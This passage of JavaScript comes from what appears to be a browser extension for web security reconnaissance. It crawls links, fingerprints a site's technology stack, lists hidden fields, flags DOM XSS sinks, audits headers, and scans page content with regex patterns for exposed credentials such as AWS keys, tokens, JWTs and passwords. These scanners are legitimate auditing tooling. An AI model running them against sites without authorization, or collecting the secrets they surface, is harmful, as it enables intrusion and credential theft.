        /\/\/[A-Za-z0-9.-]+\.[A-Za-z]{2,}[^\s"'`<>)\\]*/g,
        /["'`]((?:\/|\.\.?\/)(?:api|v\d+|graphql|rest|admin|auth|user|account|assets|static|_next|build|wp-|[A-Za-z0-9._-])[^\s"'`<>]{0,180})["'`]/gi,
      ];
      patterns.forEach(re => {
        for (const m of text.matchAll(re)) {
          const rawUrl = m[1] || m[0];
          const line = text.slice(0, m.index).split('\n').length;
          addRecord(rawUrl, source, line, base);
        }
      });
    };

    const sourceResp = await bg('FETCH', { url: pageUrl, maxBody: 400000 }).catch(() => null);
    if (sourceResp?.body) scanTextForLinks(sourceResp.body, 'page source', pageUrl);

    const uniqueScripts = [...new Set(scripts)].slice(0, 40);
    for (const scriptUrl of uniqueScripts) {
      const resp = await bg('FETCH', { url: scriptUrl, maxBody: 700000 }).catch(() => null);
      if (resp?.body) scanTextForLinks(resp.body, scriptUrl, scriptUrl);
    }

    this.spiderCache = { pageUrl, records };
    this.renderSpiderFromCache();
  },

  async techStack() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });

    // Fetch response headers via background (state.tabUrl set by assertScriptable)
    const pageUrl = state.tabUrl;
    let respHeaders = {};
    if (isHttpUrl(pageUrl)) {
      const resp = await bg('FETCH', { url: pageUrl }).catch(() => null);
      if (resp?.headers) respHeaders = resp.headers;
    }

    const raw = await execPage(() => {
      try {
        const w = window, d = document;
        const meta = n => d.querySelector(`meta[name="${n}"]`)?.content || d.querySelector(`meta[property="${n}"]`)?.content || '';
        const ck = d.cookie;
        const detect = {
          // JS Frameworks
          'React':           !!(w.React || w.__REACT_DEVTOOLS_GLOBAL_HOOK__?.renderers?.size),
          'Next.js':         !!w.__NEXT_DATA__,
          'Gatsby':          !!(w.___gatsby || d.querySelector('#gatsby-focus-wrapper')),
          'Remix':           !!(w.__remixContext || w.__remixRouteModules),
          'Vue':             !!(w.Vue || w.__VUE__ || d.querySelector('[data-v-app]')),
          'Nuxt':            !!w.__NUXT__,
          'Quasar':          !!w.Quasar,
          'Angular':         !!(w.angular || d.querySelector('[ng-version]')),
          'Svelte':          !!(w.__svelte || d.querySelector('[class*="svelte-"]')),
          'SvelteKit':       !!(w.__sveltekit_data || d.querySelector('script[data-sveltekit-prefetch]')),
          'Ember':           !!w.Ember,
          'Backbone':        !!w.Backbone,
          'Alpine.js':       !!(w.Alpine || d.querySelector('[x-data]')),
          'htmx':            !!(w.htmx || d.querySelector('[hx-get],[hx-post]')),
          'Preact':          !!(w.preact),
          'Solid.js':        !!(w._$HY),
          'Astro':           !!(d.querySelector('script[type="module"][src*="/_astro/"]') || meta('generator').includes('Astro')),
          'Qwik':            !!(w.qwikevents || d.querySelector('[q\\:container]')),
          // Libraries
          'jQuery':          !!(w.jQuery?.fn?.jquery),
          'Lodash':          !!(w._?.VERSION && w._.map),
          'Moment.js':       !!w.moment,
          'Day.js':          !!w.dayjs,
          'Axios':           !!(w.axios?.get),
          'D3.js':           !!(w.d3?.version),
          'Three.js':        !!(w.THREE?.REVISION),
          'Chart.js':        !!(w.Chart?.version),
          'GSAP':            !!(w.gsap || w.TweenMax),
          'Swiper':          !!w.Swiper,
          'Socket.io':       !!(w.io?.Socket),
          // CSS Frameworks
          'Bootstrap':       !!(w.bootstrap || d.querySelector('.container-fluid,.col-md-12,.navbar-collapse')),
          'Tailwind CSS':    !!(d.querySelector('[class*="tw-"]') || (d.querySelector('[class*="text-sm"]') && d.querySelector('[class*="bg-"]'))),
          'Bulma':           !!(d.querySelector('.is-flex,.columns,.column.is-')),
          'Foundation':      !!(w.Foundation || d.querySelector('.row.expanded,.callout')),
          // Build tools
          'Webpack':         !!(w.webpackChunk || w.__webpack_require__),
          'Vite':            !!(w.__vite_is_modern_browser || d.querySelector('script[src*="/@vite/"]')),
          'Parcel':          !!w.parcelRequire,
          // CMS / Platform
          'WordPress':       !!(d.querySelector('link[href*="wp-content"],link[href*="wp-includes"]') || meta('generator').includes('WordPress')),
          'Drupal':          !!(w.Drupal || d.querySelector('[data-drupal-link]')),
          'Joomla':          !!(w.Joomla || meta('generator').includes('Joomla')),
          'Ghost':           !!(meta('generator').includes('Ghost') || d.querySelector('link[href*="/ghost/"]')),
          'Webflow':         !!(d.querySelector('[data-wf-site]') || meta('generator').includes('Webflow')),
          'Squarespace':     !!(w.Static?.SQUARESPACE_CONTEXT || meta('generator').includes('Squarespace')),
          'Wix':             !!(w.wixBiSession || d.querySelector('[data-mesh-id]')),
          // E-commerce
          'Shopify':         !!(w.Shopify || d.querySelector('[data-shopify]')),
          'WooCommerce':     !!(d.querySelector('.woocommerce,body.woocommerce')),
          'BigCommerce':     !!(w.BCData),
          'Magento':         !!(w.Mage),
          'PrestaShop':      !!(w.prestashop),
          // Analytics
          'Google Analytics':     !!(w.ga || w.gtag || w.GoogleAnalyticsObject || d.querySelector('script[src*="google-analytics"],script[src*="gtag/js"]')),
          'Google Tag Manager':   !!(w.google_tag_manager || d.querySelector('script[src*="googletagmanager"]')),
          'Mixpanel':        !!(w.mixpanel?.track),
          'Amplitude':       !!(w.amplitude || w.amplitudeAnalytics),
          'Segment':         !!(w.analytics?.identify),
          'Heap':            !!(w.heap?.track),
          'Hotjar':          !!(w.hj || w.hjSiteSettings),
          'FullStory':       !!(w._fs_namespace),
          'Matomo':          !!(w.Matomo || w._paq),
          'Microsoft Clarity': !!w.clarity,
          'PostHog':         !!(w.posthog?.capture),
          'Plausible':       !!(d.querySelector('script[src*="plausible"]')),
          // Advertising / Pixels
          'Facebook Pixel':  !!(w.fbq || d.querySelector('script[src*="connect.facebook.net"]')),
          'Google Ads':      !!(w.google_conversion_id || d.querySelector('script[src*="googleadservices"]')),
          'LinkedIn Insight':!!(w._linkedin_data_partner_id || d.querySelector('script[src*="snap.licdn"]')),
          'TikTok Pixel':    !!(w.ttq || d.querySelector('script[src*="analytics.tiktok"]')),
          // Security / Anti-bot
          'reCAPTCHA':       !!(w.grecaptcha || d.querySelector('script[src*="recaptcha"]')),
          'hCaptcha':        !!(w.hcaptcha || d.querySelector('script[src*="hcaptcha"]')),
          'CF Turnstile':    !!(w.turnstile || d.querySelector('script[src*="challenges.cloudflare"]')),
          // Payment
          'Stripe':          !!(w.Stripe || d.querySelector('script[src*="js.stripe.com"]')),
          'PayPal':          !!(w.paypal || d.querySelector('script[src*="paypal.com/sdk"]')),
          'Braintree':       !!(w.braintree),
          // Maps
          'Google Maps':     !!(w.google?.maps || d.querySelector('script[src*="maps.googleapis"]')),
          'Mapbox':          !!(w.mapboxgl),
          'Leaflet':         !!(w.L?.map && w.L?.version),
          // Monitoring / Error tracking
          'Sentry':          !!(w.Sentry || w.__sentryRewritesTunnel),
          'Datadog RUM':     !!w.DD_RUM,
          'New Relic':       !!w.newrelic,
          'LogRocket':       !!w.LogRocket,
          'Bugsnag':         !!w.Bugsnag,
          // Live Chat
          'Intercom':        !!(w.Intercom || w.intercomSettings),
          'Zendesk':         !!(w.zE || w.zESettings),
          'Drift':           !!(w.drift?.page),
          'Crisp':           !!(w.$crisp || w.CRISP_WEBSITE_ID),
          'Tawk.to':         !!(w.Tawk_API || d.querySelector('script[src*="tawk.to"]')),
          'HubSpot Chat':    !!(w.HubSpotConversations || d.querySelector('script[src*="hs-scripts"]')),
          // Backend signals
          'PHP':             !!(ck.includes('PHPSESSID')),
          'ASP.NET':         !!(d.querySelector('input[name="__VIEWSTATE"],input[name="__RequestVerificationToken"]')),
          'Laravel':         !!(d.querySelector('meta[name="csrf-token"]') && !d.querySelector('input[name="csrfmiddlewaretoken"]') && !d.querySelector('meta[name="csrf-param"]')),
          'Django':          !!(d.querySelector('input[name="csrfmiddlewaretoken"]')),
          'Rails':           !!(d.querySelector('meta[name="csrf-token"]') && d.querySelector('meta[name="csrf-param"]')),
          // CDN (DOM signals)
          'Cloudflare':      !!(ck.includes('__cf_bm') || ck.includes('cf_clearance') || d.querySelector('script[src*="cloudflare.com"]')),
          'jsDelivr':        !!(d.querySelector('script[src*="cdn.jsdelivr.net"],link[href*="cdn.jsdelivr.net"]')),
          'unpkg':           !!(d.querySelector('script[src*="unpkg.com"],link[href*="unpkg.com"]')),
          // Fonts
          'Google Fonts':    !!(d.querySelector('link[href*="fonts.googleapis.com"],link[href*="fonts.gstatic.com"]')),
          'Adobe Fonts':     !!(d.querySelector('link[href*="use.typekit"],script[src*="use.typekit"]') || w.Typekit),
        };
        const generator = meta('generator') || null;
        const detected = Object.entries(detect).filter(([,v]) => v).map(([k]) => k);
        return JSON.stringify({ detected, generator });
      } catch { return '{"detected":[],"generator":null}'; }
    }).catch(e => { toast(String(e), 'error'); return '{"detected":[],"generator":null}'; });

    const { detected, generator } = JSON.parse(raw);

    const CATS = {
      'React':'JS Framework','Next.js':'JS Framework','Gatsby':'JS Framework','Remix':'JS Framework',
      'Vue':'JS Framework','Nuxt':'JS Framework','Quasar':'JS Framework','Angular':'JS Framework',
      'Svelte':'JS Framework','SvelteKit':'JS Framework','Ember':'JS Framework','Backbone':'JS Framework',
      'Alpine.js':'JS Framework','htmx':'JS Framework','Preact':'JS Framework','Solid.js':'JS Framework',
      'Astro':'JS Framework','Qwik':'JS Framework',
      'jQuery':'Library','Lodash':'Library','Moment.js':'Library','Day.js':'Library',
      'Axios':'Library','D3.js':'Library','Three.js':'Library','Chart.js':'Library',
      'GSAP':'Library','Swiper':'Library','Socket.io':'Library',
      'Bootstrap':'CSS Framework','Tailwind CSS':'CSS Framework','Bulma':'CSS Framework','Foundation':'CSS Framework',
      'Webpack':'Build Tool','Vite':'Build Tool','Parcel':'Build Tool',
      'WordPress':'CMS','Drupal':'CMS','Joomla':'CMS','Ghost':'CMS','Webflow':'CMS','Squarespace':'CMS','Wix':'CMS',
      'Shopify':'E-commerce','WooCommerce':'E-commerce','BigCommerce':'E-commerce','Magento':'E-commerce','PrestaShop':'E-commerce',
      'Google Analytics':'Analytics','Google Tag Manager':'Tag Manager','Mixpanel':'Analytics','Amplitude':'Analytics',
      'Segment':'Analytics','Heap':'Analytics','Hotjar':'Analytics','FullStory':'Analytics',
      'Matomo':'Analytics','Microsoft Clarity':'Analytics','PostHog':'Analytics','Plausible':'Analytics',
      'Facebook Pixel':'Advertising','Google Ads':'Advertising','LinkedIn Insight':'Advertising','TikTok Pixel':'Advertising',
      'reCAPTCHA':'Security','hCaptcha':'Security','CF Turnstile':'Security',
      'Stripe':'Payment','PayPal':'Payment','Braintree':'Payment',
      'Google Maps':'Maps','Mapbox':'Maps','Leaflet':'Maps',
      'Sentry':'Monitoring','Datadog RUM':'Monitoring','New Relic':'Monitoring','LogRocket':'Monitoring','Bugsnag':'Monitoring',
      'Intercom':'Live Chat','Zendesk':'Live Chat','Drift':'Live Chat','Crisp':'Live Chat','Tawk.to':'Live Chat','HubSpot Chat':'Live Chat',
      'PHP':'Language','ASP.NET':'Framework','Laravel':'Framework','Django':'Framework','Rails':'Framework',
      'Cloudflare':'CDN','jsDelivr':'CDN','unpkg':'CDN',
      'Google Fonts':'Fonts','Adobe Fonts':'Fonts',
    };

    const CAT_ORDER = ['Web Server','Language','Framework','JS Framework','Library','CSS Framework','Build Tool',
      'CMS','E-commerce','Analytics','Tag Manager','Advertising','Security','Payment','Maps',
      'Monitoring','Live Chat','CDN','Hosting','Fonts'];

    // Parse response headers for server-side signals
    const hdr = k => (respHeaders[k] || respHeaders[k.toLowerCase()] || '');
    const server   = hdr('server').toLowerCase();
    const powered  = hdr('x-powered-by').toLowerCase();
    const via      = hdr('via').toLowerCase();
    const headerTechs = [];
    const addH = (name, cat) => headerTechs.push({ name, cat });

    if (server.includes('nginx'))      addH('nginx', 'Web Server');
    else if (server.includes('apache'))addH('Apache', 'Web Server');
    else if (server.includes('iis'))   addH('IIS', 'Web Server');
    else if (server.includes('caddy')) addH('Caddy', 'Web Server');
    else if (server.includes('litespeed')) addH('LiteSpeed', 'Web Server');
    else if (server.includes('cloudflare')) addH('Cloudflare', 'CDN');
    else if (server && server !== 'unknown') addH(hdr('server'), 'Web Server');

    if (powered.includes('php'))       addH('PHP', 'Language');
    else if (powered.includes('asp.net')) addH('ASP.NET', 'Framework');
    else if (powered.includes('express')) addH('Express', 'Framework');
    else if (powered.includes('next.js')) addH('Next.js', 'JS Framework');
    else if (powered && powered !== 'unknown') addH(hdr('x-powered-by'), 'Language');

    if (hdr('cf-ray'))                 addH('Cloudflare', 'CDN');
    if (hdr('x-vercel-id') || hdr('x-vercel-cache')) addH('Vercel', 'Hosting');
    if (hdr('x-netlify-id') || powered.includes('netlify')) addH('Netlify', 'Hosting');
    if (via.includes('cloudfront') || hdr('x-amz-cf-id')) addH('AWS CloudFront', 'CDN');
    if (via.includes('fastly') || hdr('fastly-restarts')) addH('Fastly', 'CDN');
    if (hdr('x-github-request-id'))   addH('GitHub Pages', 'Hosting');
    if (hdr('fly-request-id'))         addH('Fly.io', 'Hosting');
    if (hdr('x-railway-request-id'))   addH('Railway', 'Hosting');
    if (hdr('x-render-origin-server')) addH('Render', 'Hosting');

    // Merge all detections into category buckets
    const byCategory = {};
    const seen = new Set();
    const addTech = (name, cat) => {
      if (seen.has(name)) return;
      seen.add(name);
      if (!byCategory[cat]) byCategory[cat] = [];
      byCategory[cat].push(name);
    };
    headerTechs.forEach(({ name, cat }) => addTech(name, cat));
    detected.forEach(name => addTech(name, CATS[name] || 'Other'));
    if (generator) addTech(generator, 'CMS');

    const totalDetected = seen.size;
    let html = `<div class="recon-section" id="recon-sec-tech" data-severity="info" data-section-name="Tech Stack">
      <h4>Tech Stack (${totalDetected})
        <button class="recon-rerun-btn" data-action="recon-rerun" data-check="tech" title="Re-run">Run</button>
        <button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button>
        <button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button>
      </h4>
      <div class="recon-section-body">`;

    // Response headers — one row per header with name/value grid
    const importantHeaders = ['server','x-powered-by','via','content-security-policy','strict-transport-security',
      'x-frame-options','x-content-type-options','x-xss-protection','access-control-allow-origin','x-generator'];
    const presentHeaders = importantHeaders.filter(k => respHeaders[k] || respHeaders[k.toLowerCase()]);
    if (presentHeaders.length) {
      html += `<div class="recon-item"><span class="tech-cat-label">Response Headers</span><div class="tech-hdr-table">`;
      presentHeaders.forEach(k => {
        const val = respHeaders[k] || respHeaders[k.toLowerCase()];
        html += `<div class="tech-hdr-row"><span class="tech-hdr-name">${esc(k)}</span><span class="tech-hdr-value">${esc(val)}</span></div>`;
      });
      html += `</div></div>`;
    }

    if (totalDetected === 0) {
      html += `<div class="recon-item muted">Nothing detected</div>`;
    } else {
      const orderedCats = [...CAT_ORDER, ...Object.keys(byCategory).filter(c => !CAT_ORDER.includes(c))];
      orderedCats.forEach(cat => {
        if (!byCategory[cat]) return;
        html += `<div class="recon-item"><span class="tech-cat-label">${esc(cat)}</span><div class="tech-badges">`;
        byCategory[cat].forEach(t => { html += `<span class="badge">${esc(t)}</span>`; });
        html += `</div></div>`;
      });
    }

    html += `</div></div>`;
    appendRecon(html);
  },

  async hiddenFields() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    const raw = await execPage(() => {
      try {
        return JSON.stringify(Array.from(document.querySelectorAll('input[type="hidden"]')).map(el => ({
          name:  el.name,
          id:    el.id,
          value: el.value,
          form:  el.closest('form')?.id || el.closest('form')?.action || '(no form)',
        })));
      } catch { return '[]'; }
    }).catch(e => { toast(String(e), 'error'); return '[]'; });
    const fields = JSON.parse(raw);
    let html = `<div class="recon-section" id="recon-sec-hidden" data-severity="info" data-section-name="Hidden Fields"><h4>Hidden Fields (${fields.length}) <button class="recon-rerun-btn" data-action="recon-rerun" data-check="hidden" title="Re-run">Run</button><button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button><button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button></h4>`;
    if (!fields.length) {
      html += `<div class="recon-item muted">None found</div>`;
    } else {
      fields.forEach(f => {
        html += `<div class="recon-item"><b>${esc(f.name || '(unnamed)')}</b>`;
        if (f.id) html += ` <span class="muted">#${esc(f.id)}</span>`;
        html += `<span style="color:var(--text);margin-left:8px">${esc(f.value)}</span>`;
        html += ` <span class="muted">form: ${esc(f.form)}</span></div>`;
      });
    }
    html += '</div>';
    appendRecon(html);
  },

  async sourceScan() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    const url = state.tabUrl;
    toast('Fetching source…', 'info');
    const { body = '', error } = await bg('FETCH', { url, maxBody: 400000 });
    if (error) { toast(`Fetch error: ${error}`, 'error'); return; }

    const comments = [...body.matchAll(/<!--[\s\S]*?-->/g)]
      .map(m => m[0].trim())
      .filter(c => c.length > 4 && !/^\s*$/.test(c.replace(/<!--|-->/g,'')));

    const endpointRe = /["'`](\/(?:api|v\d+|graphql|rest|admin|auth|user|account)[^\s"'`]{0,120})["'`]/gi;
    const endpoints = [...new Set([...body.matchAll(endpointRe)].map(m => m[1]))];

    const scriptSrcs = [...body.matchAll(/<script[^>]+src=["']([^"']+)["']/gi)].map(m => m[1]);

    const sourceSev = (endpoints.length || comments.length) ? 'med' : 'info';
    let html = `<div class="recon-section" id="recon-sec-source" data-severity="${sourceSev}" data-section-name="Source Scan"><h4>Source Scan <button class="recon-rerun-btn" data-action="recon-rerun" data-check="source" title="Re-run">Run</button><button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button><button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button></h4>`;

    if (endpoints.length) {
      html += `<div class="recon-item"><b>Potential API endpoints (${endpoints.length})</b><div style="margin-top:4px">`;
      endpoints.slice(0, 60).forEach(ep => {
        html += `<div class="muted" style="font-size:13px">${esc(ep)}</div>`;
      });
      html += `</div></div>`;
    }

    if (comments.length) {
      html += `<div class="recon-item"><b>HTML comments (${comments.length})</b>`;
      comments.slice(0, 20).forEach(c => {
        html += `<pre class="code-block">${esc(c)}</pre>`;
      });
      html += `</div>`;
    }

    if (scriptSrcs.length) {
      html += `<div class="recon-item"><b>External scripts (${scriptSrcs.length})</b><div style="margin-top:4px">`;
      scriptSrcs.slice(0, 30).forEach(s => {
        html += `<div class="muted" style="font-size:13px">${esc(s)}</div>`;
      });
      html += `</div></div>`;
    }

    if (!endpoints.length && !comments.length && !scriptSrcs.length) {
      html += `<div class="recon-item muted">Nothing interesting found</div>`;
    }

    html += '</div>';
    appendRecon(html);
  },

  async domXSS() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    toast('Scanning for DOM XSS…', 'info');

    const raw = await execPage(() => {
      try {
        const SINKS = [
          { name: 'innerHTML',              re: /\.innerHTML\s*[+]?=/ },
          { name: 'outerHTML',              re: /\.outerHTML\s*[+]?=/ },
          { name: 'document.write',         re: /document\s*\.\s*write(?:ln)?\s*\(/ },
          { name: 'eval',                   re: /\beval\s*\(/ },
          { name: 'setTimeout (string)',    re: /setTimeout\s*\(\s*(?!function|=>|\(|\/\/)/ },
          { name: 'setInterval (string)',   re: /setInterval\s*\(\s*(?!function|=>|\(|\/\/)/ },
          { name: 'new Function',           re: /new\s+Function\s*\(/ },
          { name: 'insertAdjacentHTML',     re: /\.insertAdjacentHTML\s*\(/ },
          { name: 'location.href =',        re: /location\s*(?:\.\s*href)?\s*=(?!=)/ },
          { name: 'location.assign',        re: /location\s*\.\s*assign\s*\(/ },
          { name: 'location.replace',       re: /location\s*\.\s*replace\s*\(/ },
          { name: 'window.open',            re: /window\s*\.\s*open\s*\(/ },
          { name: 'src =',                  re: /\.src\s*=(?!=)/ },
          { name: 'setAttribute (href/src)',re: /\.setAttribute\s*\(\s*["'](?:href|src|action|on\w+)["']/ },
          { name: 'jQuery .html()',         re: /\$\s*\([^)]+\)\s*\.\s*html\s*\(/ },
        ];
        const SOURCES = [
          { name: 'location.hash',          re: /location\s*\.\s*hash/ },
          { name: 'location.search',        re: /location\s*\.\s*search/ },
          { name: 'location.href',          re: /location\s*\.\s*href/ },
          { name: 'document.URL',           re: /document\s*\.\s*URL/ },
          { name: 'document.referrer',      re: /document\s*\.\s*referrer/ },
          { name: 'document.baseURI',       re: /document\s*\.\s*baseURI/ },
          { name: 'window.name',            re: /window\s*\.\s*name/ },
          { name: 'URLSearchParams',        re: /URLSearchParams/ },
          { name: 'decodeURIComponent',     re: /decodeURIComponent\s*\(/ },
          { name: 'localStorage.getItem',   re: /localStorage\s*\.\s*getItem/ },
          { name: 'sessionStorage.getItem', re: /sessionStorage\s*\.\s*getItem/ },
          { name: 'document.cookie',        re: /document\s*\.\s*cookie/ },
          { name: 'postMessage data',       re: /event\s*\.\s*data/ },
          { name: '.getAttribute',          re: /\.getAttribute\s*\(/ },
        ];

        const findings = [];
        const scripts = Array.from(document.querySelectorAll('script:not([src])'));
        const allText = scripts.map(s => s.textContent).join('\n');

        scripts.forEach((script, si) => {
          const lines = script.textContent.split('\n');
          lines.forEach((line, li) => {
            const matchedSink = SINKS.find(({ re }) => re.test(line));
            if (!matchedSink) return;
            const ctx = lines.slice(Math.max(0, li - 5), li + 6).join('\n');
            const matchedSources = SOURCES.filter(({ re }) => re.test(ctx)).map(s => s.name);
            findings.push({
              sink:    matchedSink.name,
              sources: matchedSources,
              line:    line.trim(),
              lineNo:  li + 1,
              script:  si + 1,
              hot:     matchedSources.length > 0,
            });
          });
        });

        // Direct taint patterns — high confidence
        [
          { name: 'eval(location…)',              re: /eval\s*\([^)]*location/ },
          { name: 'innerHTML = location…',        re: /\.innerHTML\s*=\s*[^;]*location/ },
          { name: 'document.write(location…)',    re: /document\.write(?:ln)?\s*\([^)]*location/ },
          { name: 'innerHTML = decodeURI…',       re: /\.innerHTML\s*=\s*[^;]*decodeURI/ },
        ].forEach(({ name, re }) => {
          if (re.test(allText)) findings.push({ sink: name, sources: ['direct taint'], line: 'Direct source-to-sink detected', lineNo: null, script: null, hot: true });
        });

        // postMessage listener — flag for manual review
        if (/addEventListener\s*\(\s*['"]message['"]/.test(allText)) {
          findings.push({ sink: 'postMessage listener', sources: ['event.data'], line: 'addEventListener("message") found — verify handler sanitises event.data before use in sink', lineNo: null, script: null, hot: true });
        }

        return JSON.stringify(findings);
      } catch { return '[]'; }
    }).catch(() => '[]');

    const findings = JSON.parse(raw);
    const hot      = findings.filter(f => f.hot);
    const cold     = findings.filter(f => !f.hot);

    const domxssSev = hot.length > 0 ? 'high' : cold.length > 0 ? 'med' : 'info';
    let html = `<div class="recon-section" id="recon-sec-domxss" data-severity="${domxssSev}" data-section-name="DOM XSS"><h4>DOM XSS (${hot.length} potential, ${cold.length} sinks only) <button class="recon-rerun-btn" data-action="recon-rerun" data-check="domxss" title="Re-run">Run</button><button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button><button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button></h4>`;

    if (!findings.length) {
      html += '<div class="recon-item muted">No dangerous sink patterns found in inline scripts</div>';
    } else {
      if (hot.length) {
        html += `<div class="recon-item"><span class="tech-cat-label">Potential DOM XSS — sink + source in context</span>`;
        hot.forEach(f => {
          const loc = f.lineNo ? `script ${f.script} line ${f.lineNo}` : '';
          html += `<div class="domxss-row domxss-hot">
            <div class="domxss-meta">
              <span class="domxss-sink">${esc(f.sink)}</span>
              ${loc ? `<span class="muted domxss-loc">${esc(loc)}</span>` : ''}
            </div>
            <div class="domxss-sources">${f.sources.map(s => `<span class="badge">${esc(s)}</span>`).join('')}</div>
            <div class="domxss-line">${esc(f.line)}</div>
          </div>`;
        });
        html += '</div>';
      }
      if (cold.length) {
        html += `<div class="recon-item"><span class="tech-cat-label">Dangerous sinks (no source detected nearby)</span>`;
        cold.forEach(f => {
          const loc = f.lineNo ? `script ${f.script} line ${f.lineNo}` : '';
          html += `<div class="domxss-row">
            <div class="domxss-meta">
              <span class="domxss-sink domxss-sink-warn">${esc(f.sink)}</span>
              ${loc ? `<span class="muted domxss-loc">${esc(loc)}</span>` : ''}
            </div>
            <div class="domxss-line">${esc(f.line)}</div>
          </div>`;
        });
        html += '</div>';
      }
    }

    html += '</div>';
    appendRecon(html);
  },

  async secrets() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    toast('Scanning for secrets…', 'info');

    const domRaw = await execPage(() => {
      try {
        const scripts  = Array.from(document.querySelectorAll('script:not([src])')).map(s => s.textContent).join('\n');
        const attrs    = Array.from(document.querySelectorAll('[data-key],[data-token],[data-secret],[data-api-key],[data-config]')).map(el => el.outerHTML).join('\n');
        const metas    = Array.from(document.querySelectorAll('meta')).map(m => m.outerHTML).join('\n');
        const comments = (document.documentElement.innerHTML.match(/<!--[\s\S]*?-->/g) || []).join('\n');
        return JSON.stringify({ scripts, attrs, metas, comments });
      } catch { return '{}'; }
    }).catch(() => '{}');

    let source = '';
    if (isHttpUrl(state.tabUrl)) {
      const resp = await bg('FETCH', { url: state.tabUrl, maxBody: 150000 }).catch(() => null);
      source = resp?.body || '';
    }

    const { scripts = '', attrs = '', metas = '', comments = '' } = JSON.parse(domRaw);
    const corpus = [
      { label: 'Inline Scripts', text: scripts },
      { label: 'DOM Attributes', text: attrs },
      { label: 'Meta Tags',      text: metas },
      { label: 'HTML Comments',  text: comments },
      { label: 'Page Source',    text: source },
    ];

    const SECRET_PATTERNS = [
      { name: 'AWS Access Key',    re: /AKIA[0-9A-Z]{16}/g },
      { name: 'GitHub Token',      re: /ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9_]{82}/g },
      { name: 'Google API Key',    re: /AIza[0-9A-Za-z\-_]{35}/g },
      { name: 'Stripe Key',        re: /(?:pk|sk)_(?:test|live)_[0-9a-zA-Z]{24,}/g },
      { name: 'Slack Token',       re: /xox[baprs]-[0-9a-zA-Z]{10,}-[0-9a-zA-Z-]+/g },
      { name: 'JWT',               re: /eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g },
      { name: 'Private Key',       re: /-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY/g },
      { name: 'NPM Token',         re: /npm_[A-Za-z0-9]{36}/g },
      { name: 'SendGrid Key',      re: /SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}/g },
      { name: 'Firebase URL',      re: /https:\/\/[a-z0-9-]+\.firebaseio\.com/g },
      { name: 'MongoDB URI',       re: /mongodb(?:\+srv)?:\/\/[^:]+:[^@]+@[^\s"'<>]+/g },
      { name: 'Basic Auth in URL', re: /https?:\/\/[^:@\s"'<>]+:[^:@\s"'<>]+@[^\s"'<>]+/g },
      { name: 'Password in JS',    re: /(?:password|passwd|pwd)\s*[:=]\s*["'][^"']{4,64}["']/gi },
      { name: 'API Key in JS',     re: /api[_-]?key\s*[:=]\s*["'][^"']{8,64}["']/gi },
      { name: 'Secret in JS',      re: /(?<![a-z])(?:secret|token)\s*[:=]\s*["'][^"']{8,64}["']/gi },
      { name: 'Bearer Token',      re: /Bearer\s+[A-Za-z0-9\-._~+/]+=*/g },
    ];

    const findings = [];
    const seen = new Set();
    corpus.forEach(({ label, text }) => {
      if (!text) return;
      SECRET_PATTERNS.forEach(({ name, re }) => {
        re.lastIndex = 0;
        let m;
        while ((m = re.exec(text)) !== null) {
          const key = `${name}:${m[0]}`;
          if (seen.has(key)) continue;
          seen.add(key);
          findings.push({ pattern: name, match: m[0], location: label });
          if (findings.length >= 200) return;
        }
      });
    });

    const SECRET_HIGH = new Set(['JWT','AWS Access Key','Private Key','GitHub Token','Stripe Key','Bearer Token','MongoDB URI','Basic Auth in URL','Password in JS','NPM Token','SendGrid Key','Google API Key','Slack Token']);
    const secretsSev = findings.some(f => SECRET_HIGH.has(f.pattern)) ? 'high' : findings.length > 0 ? 'med' : 'info';
    let html = `<div class="recon-section" id="recon-sec-secrets" data-severity="${secretsSev}" data-section-name="Secrets"><h4>Secrets &amp; Sensitive Data (${findings.length}) <button class="recon-rerun-btn" data-action="recon-rerun" data-check="secrets" title="Re-run">Run</button><button class="recon-section-toggle" data-action="recon-section-toggle" title="Collapse/expand"></button><button class="recon-copy-btn" data-action="recon-copy" title="Copy">Copy</button></h4>`;

    if (!findings.length) {
      html += '<div class="recon-item muted">No secrets detected</div>';
    } else {
      const byPattern = {};
      findings.forEach(f => { (byPattern[f.pattern] ??= []).push(f); });
      Object.entries(byPattern).forEach(([pattern, items]) => {
        html += `<div class="recon-item"><span class="tech-cat-label">${esc(pattern)}</span>`;
        items.slice(0, 10).forEach(f => {
          html += `<div class="secrets-row">
            <span class="secrets-match" title="${esc(f.match)}">${esc(f.match)}</span>
            <span class="muted secrets-loc">${esc(f.location)}</span>
            <button class="recon-copy-btn secrets-copy-btn" data-action="secrets-copy" data-val="${esc(f.match)}" title="Copy">Copy</button>
          </div>`;
        });
        if (items.length > 10) html += `<div class="muted" style="font-size:12px;margin-top:4px">+${items.length - 10} more</div>`;
        html += `</div>`;
      });
    }

    html += '</div>';
    appendRecon(html);
  },

  async headerAudit() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    const pageUrl = state.tabUrl;
    const resp = await bg('FETCH', { url: pageUrl, maxBody: 0 }).catch(() => null);
    if (!resp || resp.error) { toast(`Header audit error: ${resp?.error || 'request failed'}`, 'error'); return; }
    const headers = resp.headers || {};
    const hdr = k => headers[k] || headers[k.toLowerCase()] || '';
    const findings = [];
    const add = (severity, name, detail) => findings.push({ severity, name, detail });
    const isHttps = pageUrl.startsWith('https://');

    if (isHttps && !hdr('strict-transport-security')) add('high', 'Missing HSTS', 'strict-transport-security is absent on an HTTPS response.');
    if (!hdr('content-security-policy')) add('med', 'Missing CSP', 'content-security-policy is absent.');
